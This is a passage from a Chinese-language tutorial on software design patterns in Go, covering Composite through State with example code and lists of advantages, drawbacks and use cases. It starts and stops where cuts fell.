fmt.Println(abstractionB.Operation())&#125;</code></pre><p>桥接模式的优点</p><ul><li>分离抽象和实现：桥接模式将抽象部分与实现部分分离，使它们可以独立变化。</li><li>提高扩展性：由于抽象和实现是独立的，扩展其中一个不会影响另一个。</li><li>减少类的数量：通过组合而不是继承来扩展功能，可以减少子类的数量。</li></ul><p>桥接模式的缺点</p><ul><li>增加复杂性：引入桥接模式会增加系统的复杂性，因为需要额外的抽象层。</li></ul><p>桥接模式的适用场景</p><ul><li>希望抽象和实现可以独立变化：当一个类存在多个维度的变化时，可以使用桥接模式将这些维度分离开来。</li><li>避免类爆炸：当系统中存在多个继承层次时，使用桥接模式可以减少子类的数量。</li></ul><h3 id="组合模式（Composite）"><a href="#组合模式（Composite）" class="headerlink" title="组合模式（Composite）"></a>组合模式（Composite）</h3><p>将对象组合成树形结构以表示“部分-整体”的层次结构。组合模式使得客户端可以统一地处理单个对象和组合对象。</p><pre><code>package mainimport &quot;fmt&quot;// Component 是组合模式中的组件接口type Component interface &#123;    Operation()    Add(Component)    Remove(Component)    GetChild(int) Component&#125;// Leaf 是组合模式中的叶子节点type Leaf struct &#123;    name string&#125;func (l *Leaf) Operation() &#123;    fmt.Println(&quot;Leaf&quot;, l.name, &quot;operation&quot;)&#125;func (l *Leaf) Add(c Component) &#123;    fmt.Println(&quot;Cannot add to a leaf&quot;)&#125;func (l *Leaf) Remove(c Component) &#123;    fmt.Println(&quot;Cannot remove from a leaf&quot;)&#125;func (l *Leaf) GetChild(i int) Component &#123;    fmt.Println(&quot;Cannot get child from a leaf&quot;)    return nil&#125;// Composite 是组合模式中的组合节点type Composite struct &#123;    children []Component    name     string&#125;func (c *Composite) Operation() &#123;    fmt.Println(&quot;Composite&quot;, c.name, &quot;operation&quot;)    for _, child := range c.children &#123;        child.Operation()    &#125;&#125;func (c *Composite) Add(component Component) &#123;    c.children = append(c.children, component)&#125;func (c *Composite) Remove(component Component) &#123;    for i, child := range c.children &#123;        if child == component &#123;            c.children = append(c.children[:i], c.children[i+1:]...)            break        &#125;    &#125;&#125;func (c *Composite) GetChild(i int) Component &#123;    if i &gt;= 0 &amp;&amp; i &lt; len(c.children) &#123;        return c.children[i]    &#125;    return nil&#125;func main() &#123;    leaf1 := &amp;Leaf&#123;name: &quot;Leaf1&quot;&#125;    leaf2 := &amp;Leaf&#123;name: &quot;Leaf2&quot;&#125;    leaf3 := &amp;Leaf&#123;name: &quot;Leaf3&quot;&#125;    composite1 := &amp;Composite&#123;name: &quot;Composite1&quot;&#125;    composite2 := &amp;Composite&#123;name: &quot;Composite2&quot;&#125;    composite1.Add(leaf1)    composite1.Add(leaf2)    composite2.Add(leaf3)    composite2.Add(composite1)    composite2.Operation()&#125;</code></pre><p>组合模式的优点</p><ul><li>简化客户端代码：客户端可以一致地使用组合结构和单个对象，无需关心它们的区别。</li><li>更容易扩展：可以很容易地增加新的组件类型，客户端代码不需要做任何修改。</li><li>更灵活的结构：可以动态地创建复杂的树形结构，灵活地添加或删除组件。</li></ul><p>组合模式的缺点</p><ul><li>可能导致过度设计：如果系统的层次结构过于简单，使用组合模式可能会显得过于复杂。</li><li>难以限制组件类型：在组合模式中，难以对叶子节点和组合节点进行类型上的限制。</li></ul><p>组合模式的适用场景</p><ul><li>表示部分-整体层次结构：需要表示对象的部分-整体层次结构。</li><li>统一处理单个对象和组合对象：希望客户端可以一致地处理单个对象和组合对象。</li></ul><h3 id="享元模式（Flyweight）"><a href="#享元模式（Flyweight）" class="headerlink" title="享元模式（Flyweight）"></a>享元模式（Flyweight）</h3><p>通过共享大量细粒度对象来减少内存使用和提高性能。享元模式的核心思想是将对象的状态分为内部状态和外部状态，内部状态是可以共享的，而外部状态是可以变化的。通过共享内部状态，可以减少内存的使用。享元模式从对象中剥离出不发生改变且多个实例需要的重复数据，独立出一个享元，使多个对象共享，从而节省内存以及减少对象数量。</p><pre><code>package mainimport (    &quot;fmt&quot;)// Flyweight 是享元接口，定义了一个操作方法type Flyweight interface &#123;    Operation(extrinsicState string)&#125;// ConcreteFlyweight 是具体的享元类，实现了 Flyweight 接口type ConcreteFlyweight struct &#123;    intrinsicState string&#125;func (f *ConcreteFlyweight) Operation(extrinsicState string) &#123;    fmt.Printf(&quot;Intrinsic State: %s, Extrinsic State: %s\n&quot;, f.intrinsicState, extrinsicState)&#125;// FlyweightFactory 是享元工厂类，负责创建和管理享元对象type FlyweightFactory struct &#123;    flyweights map[string]Flyweight&#125;func NewFlyweightFactory() *FlyweightFactory &#123;    return &amp;FlyweightFactory&#123;        flyweights: make(map[string]Flyweight),    &#125;&#125;func (f *FlyweightFactory) GetFlyweight(key string) Flyweight &#123;    if flyweight, exists := f.flyweights[key]; exists &#123;        return flyweight    &#125;    flyweight := &amp;ConcreteFlyweight&#123;intrinsicState: key&#125;    f.flyweights[key] = flyweight    return flyweight&#125;func main() &#123;    factory := NewFlyweightFactory()    flyweight1 := factory.GetFlyweight(&quot;state1&quot;)    flyweight1.Operation(&quot;extrinsic1&quot;)    flyweight2 := factory.GetFlyweight(&quot;state2&quot;)    flyweight2.Operation(&quot;extrinsic2&quot;)    flyweight3 := factory.GetFlyweight(&quot;state1&quot;)    flyweight3.Operation(&quot;extrinsic3&quot;)    fmt.Printf(&quot;Flyweight1 and Flyweight3 are the same instance: %v\n&quot;, flyweight1 == flyweight3)&#125;</code></pre><p>享元模式的优点</p><ul><li>减少内存使用：通过共享内部状态，可以显著减少内存的使用。</li><li>提高性能：减少了创建对象的开销，提高了系统的性能。</li></ul><p>享元模式的缺点</p><ul><li>复杂性增加：需要分离内部状态和外部状态，增加了系统的复杂性。</li><li>管理共享对象：需要额外的代码来管理共享对象。</li></ul><p>享元模式的适用场景</p><ul><li>大量相似对象：系统中有大量相似的对象，这些对象的大部分状态是可以共享的。</li><li>内存使用优化：需要优化内存使用，减少内存开销。</li></ul><h2 id="行为型模式"><a href="#行为型模式" class="headerlink" title="行为型模式"></a>行为型模式</h2><h3 id="模版方法模式（Template-Method）"><a href="#模版方法模式（Template-Method）" class="headerlink" title="模版方法模式（Template-Method）"></a>模版方法模式（Template-Method）</h3><p>模版方法模式使用继承机制，把通用步骤和通用方法放到父类中，把具体实现延迟到子类中实现。使得实现符合开闭原则。</p><p>模版方法模式的角色和职责</p><ul><li>AbstractClass（抽象类）：在抽象类中定义了一系列基本操作(PrimitiveOperations)，这些基本操作可以是具体的，也可以是抽象的，每一个基本操作对应算法的一个步骤，在其子类中可以重定义或实现这些步骤。同时，在抽象类中实现了一个模板方法(Template Method)，用于定义一个算法的框架，模板方法不仅可以调用在抽象类中实现的基本方法，也可以调用在抽象类的子类中实现的基本方法，还可以调用其他对象中的方法。</li><li>ConcreteClass（具体子类）：它是抽象类的子类，用于实现在父类中声明的抽象基本操作以完成子类特定算法的步骤，也可以覆盖在父类中已经实现的具体基本操作。</li></ul><pre><code>package mainimport &quot;fmt&quot;//抽象类，制作饮料,包裹一个模板的全部实现步骤type Beverage interface &#123;    BoilWater() //煮开水    Brew()      //冲泡    PourInCup() //倒入杯中    AddThings() //添加酌料    WantAddThings() bool //是否加入酌料Hook&#125;//封装一套流程模板，让具体的制作流程继承且实现type template struct &#123;    b Beverage&#125;//封装的固定模板func (t *template) MakeBeverage() &#123;    if t == nil &#123;        return    &#125;    t.b.BoilWater()    t.b.Brew()    t.b.PourInCup()    //子类可以重写该方法来决定是否执行下面动作    if t.b.WantAddThings() == true &#123;        t.b.AddThings()    &#125;&#125;//具体的模板子类 制作咖啡type MakeCaffee struct &#123;    template  //继承模板&#125;func NewMakeCaffee() *MakeCaffee &#123;    makeCaffe := new(MakeCaffee)    //b 为Beverage，是MakeCaffee的接口，这里需要给接口赋值，指向具体的子类对象    //来触发b全部接口方法的多态特性。    makeCaffe.b = makeCaffe    return makeCaffe&#125;func (mc *MakeCaffee) BoilWater() &#123;    fmt.Println(&quot;将水煮到100摄氏度&quot;)&#125;func (mc *MakeCaffee) Brew() &#123;    fmt.Println(&quot;用水冲咖啡豆&quot;)&#125;func (mc *MakeCaffee) PourInCup() &#123;    fmt.Println(&quot;将充好的咖啡倒入陶瓷杯中&quot;)&#125;func (mc *MakeCaffee) AddThings() &#123;    fmt.Println(&quot;添加牛奶和糖&quot;)&#125;func (mc *MakeCaffee) WantAddThings() bool &#123;    return true //启动Hook条件&#125;//具体的模板子类 制作茶type MakeTea struct &#123;    template  //继承模板&#125;func NewMakeTea() *MakeTea &#123;    makeTea := new(MakeTea)    //b 为Beverage，是MakeTea，这里需要给接口赋值，指向具体的子类对象    //来触发b全部接口方法的多态特性。    makeTea.b = makeTea    return makeTea&#125;func (mt *MakeTea) BoilWater() &#123;    fmt.Println(&quot;将水煮到80摄氏度&quot;)&#125;func (mt *MakeTea) Brew() &#123;    fmt.Println(&quot;用水冲茶叶&quot;)&#125;func (mt *MakeTea) PourInCup() &#123;    fmt.Println(&quot;将充好的咖啡倒入茶壶中&quot;)&#125;func (mt *MakeTea) AddThings() &#123;    fmt.Println(&quot;添加柠檬&quot;)&#125;func (mt *MakeTea) WantAddThings() bool &#123;    return false //关闭Hook条件&#125;func main() &#123;    //1. 制作一杯咖啡    makeCoffee := NewMakeCaffee()    makeCoffee.MakeBeverage() //调用固定模板方法    fmt.Println(&quot;------------&quot;)    //2. 制作茶    makeTea := NewMakeTea()    makeTea.MakeBeverage()&#125;</code></pre><p>模板方法模式的优点</p><ul><li>代码复用：将通用的代码放在抽象类中，避免重复代码。</li><li>灵活性：允许子类在不改变算法结构的情况下，重新定义算法中的某些步骤。</li><li>控制反转：通过模板方法模式，父类控制算法的执行流程，而子类只需实现具体的步骤。</li><li>在模板方法模式中可以通过子类来覆盖父类的基本方法，不同的子类可以提供基本方法的不同实现，更换和增加新的子类很方便，符合单一职责原则和开闭原则。</li></ul><p>模板方法模式的缺点</p><ul><li>增加复杂性：引入模板方法模式会增加系统的复杂性，因为需要额外的抽象类和子类。</li><li>难以维护：如果算法步骤过多，可能会导致代码难以维护。</li></ul><p>模版方法模式的适用场景</p><ul><li>算法的多个步骤：一个操作的算法可以分为多个步骤，并且这些步骤在不同的实现中可能会有所不同。</li><li>代码复用：需要在多个子类中复用通用的代码。</li></ul><h3 id="命令模式（Command）"><a href="#命令模式（Command）" class="headerlink" title="命令模式（Command）"></a>命令模式（Command）</h3><p>命令模式本质是把某个对象的方法调用封装到对象中，方便传递、存储、调用。</p><p>命令模式的角色和职责</p><ul><li>Command（抽象命令类）：抽象命令类一般是一个抽象类或接口，在其中声明了用于执行请求的execute()等方法，通过这些方法可以调用请求接收者的相关操作。</li><li>ConcreteCommand（具体命令类）：具体命令类是抽象命令类的子类，实现了在抽象命令类中声明的方法，它对应具体的接收者对象，将接收者对象的动作绑定其中。在实现execute()方法时，将调用接收者对象的相关操作(Action)。</li><li>Invoker（调用者）：调用者即请求发送者，它通过命令对象来执行请求。一个调用者并不需要在设计时确定其接收者，因此它只与抽象命令类之间存在关联关系。在程序运行时可以将一个具体命令对象注入其中，再调用具体命令对象的execute()方法，从而实现间接调用请求接收者的相关操作。</li><li>Receiver（接收者）：接收者执行与请求相关的操作，它具体实现对请求的业务处理。</li></ul><pre><code>package mainimport &quot;fmt&quot;// Command 是命令接口，定义了执行命令的方法type Command interface &#123;    Execute()&#125;// Light 是接收者类，具有具体的操作type Light struct&#123;&#125;func (l *Light) On() &#123;    fmt.Println(&quot;Light is On&quot;)&#125;func (l *Light) Off() &#123;    fmt.Println(&quot;Light is Off&quot;)&#125;// LightOnCommand 是具体的命令类，实现了 Command 接口type LightOnCommand struct &#123;    light *Light&#125;func (c *LightOnCommand) Execute() &#123;    c.light.On()&#125;// LightOffCommand 是具体的命令类，实现了 Command 接口type LightOffCommand struct &#123;    light *Light&#125;func (c *LightOffCommand) Execute() &#123;    c.light.Off()&#125;// RemoteControl 是调用者类，持有命令对象type RemoteControl struct &#123;    command Command&#125;func (r *RemoteControl) SetCommand(command Command) &#123;    r.command = command&#125;func (r *RemoteControl) PressButton() &#123;    r.command.Execute()&#125;func main() &#123;    light := &amp;Light&#123;&#125;    lightOnCommand := &amp;LightOnCommand&#123;light: light&#125;    lightOffCommand := &amp;LightOffCommand&#123;light: light&#125;    remote := &amp;RemoteControl&#123;&#125;    // 打开灯    remote.SetCommand(lightOnCommand)    remote.PressButton()    // 关闭灯    remote.SetCommand(lightOffCommand)    remote.PressButton()&#125;</code></pre><p>命令模式的优点</p><ul><li>解耦请求的发送者和接收者：发送者和接收者通过命令对象进行通信，彼此之间不需要直接引用。</li><li>支持撤销和重做操作：可以很容易地实现命令的撤销和重做功能。</li><li>支持日志记录：可以记录命令的执行历史，从而支持命令的重放。</li><li>支持组合命令：可以将多个命令组合成一个复合命令，从而简化复杂操作的实现。</li></ul><p>命令模式的缺点</p><ul><li>增加系统复杂性：引入命令模式会增加系统的复杂性，因为需要定义大量的命令类。</li><li>命令对象的管理：需要管理命令对象的生命周期，可能会增加内存开销。</li></ul><p>命令模式的适用场景</p><ul><li>需要对请求排队或记录请求日志：可以记录命令的执行历史，从而支持命令的重放。</li><li>需要支持撤销和重做操作：可以很容易地实现命令的撤销和重做功能。</li><li>需要将一组操作组合成一个操作：可以将多个命令组合成一个复合命令，从而简化复杂操作的实现。</li></ul><h3 id="策略模式（Strategy）"><a href="#策略模式（Strategy）" class="headerlink" title="策略模式（Strategy）"></a>策略模式（Strategy）</h3><p>定义了一系列算法，并将每个算法封装起来，使它们可以互相替换。策略模式使得算法可以独立于使用它的客户端而变化。</p><p>策略模式的角色和职责</p><ul><li>Context（环境类）：环境类是使用算法的角色，它在解决某个问题（即实现某个方法）时可以采用多种策略。在环境类中维持一个对抽象策略类的引用实例，用于定义所采用的策略。</li><li>Strategy（抽象策略类）：它为所支持的算法声明了抽象方法，是所有策略类的父类，它可以是抽象类或具体类，也可以是接口。环境类通过抽象策略类中声明的方法在运行时调用具体策略类中实现的算法。</li><li>ConcreteStrategy（具体策略类）：它实现了在抽象策略类中声明的算法，在运行时，具体策略类将覆盖在环境类中定义的抽象策略类对象，使用一种具体的算法实现某个业务处理。</li></ul><pre><code>package mainimport &quot;fmt&quot;// Strategy 是定义了算法接口type Strategy interface &#123;    Execute(a, b int) int&#125;// ConcreteStrategyAdd 是具体的加法策略type ConcreteStrategyAdd struct&#123;&#125;func (s *ConcreteStrategyAdd) Execute(a, b int) int &#123;    return a + b&#125;// ConcreteStrategySubtract 是具体的减法策略type ConcreteStrategySubtract struct&#123;&#125;func (s *ConcreteStrategySubtract) Execute(a, b int) int &#123;    return a - b&#125;// ConcreteStrategyMultiply 是具体的乘法策略type ConcreteStrategyMultiply struct&#123;&#125;func (s *ConcreteStrategyMultiply) Execute(a, b int) int &#123;    return a * b&#125;// Context 是上下文类，使用策略来执行算法type Context struct &#123;    strategy Strategy&#125;func (c *Context) SetStrategy(strategy Strategy) &#123;    c.strategy = strategy&#125;func (c *Context) ExecuteStrategy(a, b int) int &#123;    return c.strategy.Execute(a, b)&#125;func main() &#123;    context := &amp;Context&#123;&#125;    // 使用加法策略    context.SetStrategy(&amp;ConcreteStrategyAdd&#123;&#125;)    fmt.Println(&quot;10 + 5 =&quot;, context.ExecuteStrategy(10, 5))    // 使用减法策略    context.SetStrategy(&amp;ConcreteStrategySubtract&#123;&#125;)    fmt.Println(&quot;10 - 5 =&quot;, context.ExecuteStrategy(10, 5))    // 使用乘法策略    context.SetStrategy(&amp;ConcreteStrategyMultiply&#123;&#125;)    fmt.Println(&quot;10 * 5 =&quot;, context.ExecuteStrategy(10, 5))&#125;</code></pre><p>策略模式的优点</p><ul><li>算法可以自由切换：不同的算法可以独立于客户端进行切换。</li><li>避免使用多重条件判断：通过使用策略模式，可以避免在客户端代码中使用多重条件判断来选择算法。</li><li>扩展性好：增加新的算法时，只需要添加新的策略类，而不需要修改现有的代码。</li></ul><p>策略模式的缺点</p><ul><li>增加对象数量：每个策略都是一个独立的类，会增加系统中类的数量。</li><li>客户端必须了解不同的策略：客户端必须知道所有的策略，并且自行选择合适的策略。</li></ul><p>策略模式的适用场景</p><ul><li>多种算法的场景：需要在多种算法中进行选择的场景。</li><li>算法需要自由切换的场景：算法需要在运行时根据不同的条件进行切换的场景。</li><li>避免多重条件判断的场景：需要避免在客户端代码中使用多重条件判断来选择算法的场景。</li></ul><h3 id="观察者模式（Observer）"><a href="#观察者模式（Observer）" class="headerlink" title="观察者模式（Observer）"></a>观察者模式（Observer）</h3><p>定义了一种一对多的依赖关系，让多个观察者对象同时监听某一个主题对象。当主题对象的状态发生变化时，所有依赖于它的观察者对象都会得到通知并自动更新。</p><p>观察者模式角色和职责</p><ul><li>Subject（被观察者或目标，抽象主题）：被观察的对象。当需要被观察的状态发生变化时，需要通知队列中所有观察者对象。Subject需要维持（添加，删除，通知）一个观察者对象的队列列表。</li><li>ConcreteSubject（具体被观察者或目标，具体主题）：被观察者的具体实现。包含一些基本的属性状态及其他操作。</li><li>Observer（观察者）：接口或抽象类。当Subject的状态发生变化时，Observer对象将通过一个callback函数得到通知。</li><li>ConcreteObserver（具体观察者）：观察者的具体实现。得到通知后将完成一些具体的业务逻辑处理。</li></ul><pre><code>package mainimport &quot;fmt&quot;// Observer 是观察者接口，定义了 Update 方法type Observer interface &#123;    Update(message string)&#125;// Subject 是主题接口，定义了注册、注销和通知观察者的方法type Subject interface &#123;    RegisterObserver(observer Observer)    RemoveObserver(observer Observer)    NotifyObservers()&#125;// ConcreteSubject 是具体的主题类，维护了一个观察者列表type ConcreteSubject struct &#123;    observers []Observer    message   string&#125;func (s *ConcreteSubject) RegisterObserver(observer Observer) &#123;    s.observers = append(s.observers, observer)&#125;func (s *ConcreteSubject) RemoveObserver(observer Observer) &#123;    for i, o := range s.observers &#123;        if o == observer &#123;            s.observers = append(s.observers[:i], s.observers[i+1:]...)            break        &#125;    &#125;&#125;func (s *ConcreteSubject) NotifyObservers() &#123;    for _, observer := range s.observers &#123;        observer.Update(s.message)    &#125;&#125;func (s *ConcreteSubject) SetMessage(message string) &#123;    s.message = message    s.NotifyObservers()&#125;// ConcreteObserver 是具体的观察者类，实现了 Observer 接口type ConcreteObserver struct &#123;    name string&#125;func (o *ConcreteObserver) Update(message string) &#123;    fmt.Printf(&quot;%s received message: %s\n&quot;, o.name, message)&#125;func main() &#123;    subject := &amp;ConcreteSubject&#123;&#125;    observer1 := &amp;ConcreteObserver&#123;name: &quot;Observer 1&quot;&#125;    observer2 := &amp;ConcreteObserver&#123;name: &quot;Observer 2&quot;&#125;    subject.RegisterObserver(observer1)    subject.RegisterObserver(observer2)    subject.SetMessage(&quot;Hello, Observers!&quot;)    subject.RemoveObserver(observer1)    subject.SetMessage(&quot;Hello, Observer 2!&quot;)&#125;</code></pre><p>观察者模式的优点</p><ul><li>解耦：观察者模式将观察者和被观察者解耦，使得它们可以独立变化。</li><li>灵活性：可以在运行时动态地添加或删除观察者。</li><li>广播通信：主题对象会自动通知所有的观察者，无需单独通知每个观察者。</li></ul><p>观察者模式的缺点</p><ul><li>性能开销：如果观察者很多，通知所有观察者可能会有性能开销。</li><li>复杂性增加：引入观察者模式会增加系统的复杂性，特别是在观察者和被观察者之间的依赖关系较为复杂时。</li><li>通知顺序不确定：观察者的通知顺序可能不确定，可能会导致一些难以调试的问题。</li></ul><p>观察者模式的适用场景</p><ul><li>事件处理系统：需要在某个事件发生时通知多个对象。</li><li>数据变化通知：需要在数据变化时通知多个依赖于数据的对象。</li><li>订阅-发布系统：需要实现订阅-发布机制的系统。</li></ul><h3 id="职责链模式（Chain-of-Responsibility）"><a href="#职责链模式（Chain-of-Responsibility）" class="headerlink" title="职责链模式（Chain of Responsibility）"></a>职责链模式（Chain of Responsibility）</h3><p>允许多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合。这些对象通过形成一条链来传递请求，直到有一个对象处理它为止。</p><pre><code>package mainimport &quot;fmt&quot;// Handler 是处理请求的接口type Handler interface &#123;    SetNext(handler Handler)    Handle(request string)&#125;// BaseHandler 是 Handler 接口的基础实现type BaseHandler struct &#123;    next Handler&#125;func (h *BaseHandler) SetNext(handler Handler) &#123;    h.next = handler&#125;func (h *BaseHandler) Handle(request string) &#123;    if h.next != nil &#123;        h.next.Handle(request)    &#125;&#125;// ConcreteHandlerA 是具体的处理者Atype ConcreteHandlerA struct &#123;    BaseHandler&#125;func (h *ConcreteHandlerA) Handle(request string) &#123;    if request == &quot;A&quot; &#123;        fmt.Println(&quot;ConcreteHandlerA handled the request&quot;)    &#125; else &#123;        h.BaseHandler.Handle(request)    &#125;&#125;// ConcreteHandlerB 是具体的处理者Btype ConcreteHandlerB struct &#123;    BaseHandler&#125;func (h *ConcreteHandlerB) Handle(request string) &#123;    if request == &quot;B&quot; &#123;        fmt.Println(&quot;ConcreteHandlerB handled the request&quot;)    &#125; else &#123;        h.BaseHandler.Handle(request)    &#125;&#125;func main() &#123;    handlerA := &amp;ConcreteHandlerA&#123;&#125;    handlerB := &amp;ConcreteHandlerB&#123;&#125;    handlerA.SetNext(handlerB)    requests := []string&#123;&quot;A&quot;, &quot;B&quot;, &quot;C&quot;&#125;    for _, request := range requests &#123;        handlerA.Handle(request)    &#125;&#125;</code></pre><p>职责链模式的优点</p><ul><li>降低耦合度：请求的发送者和接收者解耦，发送者不需要知道具体的接收者是谁。</li><li>动态组合职责：可以动态地添加或删除处理请求的对象，灵活性高。</li><li>职责分担：每个对象只需处理自己负责的部分，其余的交给下一个对象处理。</li></ul><p>职责链模式的缺点</p><ul><li>性能问题：如果链条过长，可能会导致性能问题，因为请求需要经过多个对象传递。</li><li>调试困难：由于请求的处理过程是动态的，调试和跟踪请求的处理过程可能比较困难。</li></ul><p>职责链模式的适用场景</p><ul><li>多个对象可以处理同一个请求：系统中有多个对象可以处理同一个请求，但具体由哪个对象处理在运行时动态决定。</li><li>动态指定处理对象：需要在运行时动态地指定处理请求的对象。</li><li>职责分离：需要将不同的职责分离到不同的对象中。</li></ul><h3 id="中介者模式（Mediator）"><a href="#中介者模式（Mediator）" class="headerlink" title="中介者模式（Mediator）"></a>中介者模式（Mediator）</h3><p>定义了一个中介者对象来封装一组对象之间的交互。中介者模式通过使对象之间不直接相互引用，从而使其耦合松散，并可以独立地改变它们之间的交互。</p><pre><code>package mainimport &quot;fmt&quot;// Mediator 是中介者接口，定义了对象之间交互的方法type Mediator interface &#123;    Send(message string, colleague Colleague)&#125;// Colleague 是同事类接口，定义了与中介者交互的方法type Colleague interface &#123;    SetMediator(mediator Mediator)    Send(message string)    Receive(message string)&#125;// ConcreteMediator 是具体的中介者类，实现了 Mediator 接口type ConcreteMediator struct &#123;    colleague1 *ConcreteColleague1    colleague2 *ConcreteColleague2&#125;func (m *ConcreteMediator) Send(message string, colleague Colleague) &#123;    if colleague == m.colleague1 &#123;        m.colleague2.Receive(message)    &#125; else &#123;        m.colleague1.Receive(message)    &#125;&#125;// ConcreteColleague1 是具体的同事类1，实现了 Colleague 接口type ConcreteColleague1 struct &#123;    mediator Mediator&#125;func (c *ConcreteColleague1) SetMediator(mediator Mediator) &#123;    c.mediator = mediator&#125;func (c *ConcreteColleague1) Send(message string) &#123;    fmt.Println(&quot;Colleague1 sends message:&quot;, message)    c.mediator.Send(message, c)&#125;func (c *ConcreteColleague1) Receive(message string) &#123;    fmt.Println(&quot;Colleague1 receives message:&quot;, message)&#125;// ConcreteColleague2 是具体的同事类2，实现了 Colleague 接口type ConcreteColleague2 struct &#123;    mediator Mediator&#125;func (c *ConcreteColleague2) SetMediator(mediator Mediator) &#123;    c.mediator = mediator&#125;func (c *ConcreteColleague2) Send(message string) &#123;    fmt.Println(&quot;Colleague2 sends message:&quot;, message)    c.mediator.Send(message, c)&#125;func (c *ConcreteColleague2) Receive(message string) &#123;    fmt.Println(&quot;Colleague2 receives message:&quot;, message)&#125;func main() &#123;    mediator := &amp;ConcreteMediator&#123;&#125;    colleague1 := &amp;ConcreteColleague1&#123;&#125;    colleague2 := &amp;ConcreteColleague2&#123;&#125;    colleague1.SetMediator(mediator)    colleague2.SetMediator(mediator)    mediator.colleague1 = colleague1    mediator.colleague2 = colleague2    colleague1.Send(&quot;Hello, Colleague2!&quot;)    colleague2.Send(&quot;Hi, Colleague1!&quot;)&#125;</code></pre><p>中介者模式的优点</p><ul><li>降低耦合：中介者模式通过引入中介者对象，使得对象之间的耦合度降低，便于独立地修改和扩展各个对象。</li><li>集中控制：中介者模式将对象之间的交互逻辑集中到中介者对象中，便于管理和维护。</li><li>简化对象协议：对象之间不再需要直接交互，只需与中介者交互，简化了对象之间的协议。</li></ul><p>中介者模式的缺点</p><ul><li>中介者复杂性：随着系统的复杂性增加，中介者对象本身可能会变得复杂，难以维护。</li><li>性能问题：所有的交互都通过中介者进行，可能会带来性能上的开销。</li></ul><p>中介者模式的适用场景</p><ul><li>对象之间存在复杂的交互：对象之间的交互复杂且多样，通过中介者模式可以简化对象之间的交互。</li><li>需要解耦对象之间的依赖关系：希望通过引入中介者对象来降低对象之间的耦合度。</li></ul><h3 id="备忘录模式（Memento）"><a href="#备忘录模式（Memento）" class="headerlink" title="备忘录模式（Memento）"></a>备忘录模式（Memento）</h3><p>允许在不破坏封装的前提下捕获和恢复对象的内部状态。备忘录模式通过保存对象的状态，使得对象可以在需要时恢复到之前的状态。</p><pre><code>package mainimport &quot;fmt&quot;// Memento 是一个空接口，用于表示备忘录对象type Memento interface&#123;&#125;// Game 是需要保存和恢复状态的对象type Game struct &#123;    hp, mp int&#125;// gameMemento 是一个私有结构体，用于保存 Game 的状态type gameMemento struct &#123;    hp, mp int&#125;// Play 方法用于改变游戏的状态func (g *Game) Play(hpDelta, mpDelta int) &#123;    g.hp += hpDelta    g.mp += mpDelta&#125;// Save 方法用于创建一个 gameMemento 对象，保存当前的 hp 和 mpfunc (g *Game) Save() Memento &#123;    return &amp;gameMemento&#123;        hp: g.hp,        mp: g.mp,    &#125;&#125;// Load 方法用于从一个 Memento 对象中恢复 hp 和 mpfunc (g *Game) Load(m Memento) &#123;    if gm, ok := m.(*gameMemento); ok &#123;        g.hp = gm.hp        g.mp = gm.mp    &#125;&#125;// Status 方法用于打印当前的 hp 和 mpfunc (g *Game) Status() &#123;    fmt.Printf(&quot;Current HP: %d, MP: %d\n&quot;, g.hp, g.mp)&#125;func main() &#123;    // 初始化游戏对象    game := &amp;Game&#123;hp: 100, mp: 50&#125;    game.Status()    // 改变游戏状态    game.Play(-10, 20)    game.Status()    // 保存当前状态    savedState := game.Save()    // 再次改变游戏状态    game.Play(-20, -30)    game.Status()    // 恢复之前保存的状态    game.Load(savedState)    game.Status()&#125;</code></pre><p>备忘录模式的优点</p><ul><li>状态恢复：可以在需要时恢复对象的状态，而不需要暴露对象的内部结构。</li><li>封装性：备忘录模式保持了对象的封装性，外部对象无法访问对象的内部状态。</li><li>简化撤销操作：通过保存对象的状态，可以简化撤销操作的实现。</li></ul><p>备忘录模式的缺点</p><ul><li>内存开销：保存对象的状态可能会占用较多的内存，特别是当对象的状态较大时。</li><li>实现复杂性：实现备忘录模式可能会增加系统的复杂性，特别是在需要保存多个对象的状态时。</li></ul><p>备忘录模式的适用场景</p><ul><li>需要保存和恢复对象状态：需要在某个时刻保存对象的状态，并在需要时恢复。</li><li>实现撤销操作：需要实现撤销操作，通过保存对象的状态，可以轻松实现撤销功能。</li></ul><h3 id="状态模式（State）"><a href="#状态模式（State）" class="headerlink" title="状态模式（State）"></a>状态模式（State）</h3><p>允许对象在内部状态改变时改变其行为。状态模式将状态的行为封装在独立的状态类中，并将状态的转换逻辑委托给这些状态类，从而使得对象的行为可以随着状态的变化而变化。</p><pre><code>package mainimport &quot;fmt&quot;// State 是状态接口，定义了所有具体状态类的共同接口type State interface &#123;    Handle(context *Context)&#125;// ConcreteStateA 是具体状态类Atype ConcreteStateA struct&#123;&#125;func (s *ConcreteStateA) Handle(context *Context) &#123;    fmt.Println(&quot;State A handling request and changing state to B&quot;)    context.SetState(&amp;ConcreteStateB&#123;&#125;)&#125;// ConcreteStateB 是具体状态类Btype ConcreteStateB struct&#123;&#125;func (s *ConcreteStateB) Handle(context *Context) &#123;    fmt.Println(&quot;State B handling request and changing state to A&quot;)    context.SetState(&amp;ConcreteStateA&#123;&#125;)&#125;// Context 是上下文类，维护一个State实例type Context struct &#123;    state State&#125;func (c *Context) SetState(state State) &#123;    c.state = state&#125;func (c *Context) Request() &#123;    c.state.Handle(c)&#125;func main() &#123;    context := &amp;Context&#123;state: &amp;ConcreteStateA&#123;&#125;&#125;    context.Request() // Output: State A handling request and changing state to B    context.Request() // Output: State B handling request and changing state to A    context.Request() // Output: State A handling request and changing state to B    context.Request() // Output: State B handling request and changing state to A&#125;</code></pre><p>状态模式的优点</p><ul><li>状态切换明确：将状态的行为封装在独立的状态类中，使得状态切换更加明确和易于管理。</li><li>简化复杂状态逻辑：通过将状态相关的行为分散到不同的状态类中，简化了复杂的状态逻辑。</li><li>增加新的状态容易：增加新的状态只需要添加新的状态类，不需要修改现有的状态类和上下文类。</li></ul><p>状态模式的缺点</p><ul><li>增加类的数量：状态模式会增加类的数量，因为每个状态都需要一个独立的类。</li><li>状态切换逻辑分散：状态切换的逻辑分散在各个状态类中，可能会导致代码难以理解和维护。</li></ul><p>状态模式的适用场景</p><ul><li>对象的行为依赖于其状态：对象的行为依赖于其状态，并且需要在运行时根据状态改变行为。</li><li>状态切换频繁：对象的状态切换频繁，并且状态之间的转换逻辑复杂。</li></ul><h3 id="解释器模式（Interpreter）"><a href="#解释器模式（Interpreter）" class="headerlink" 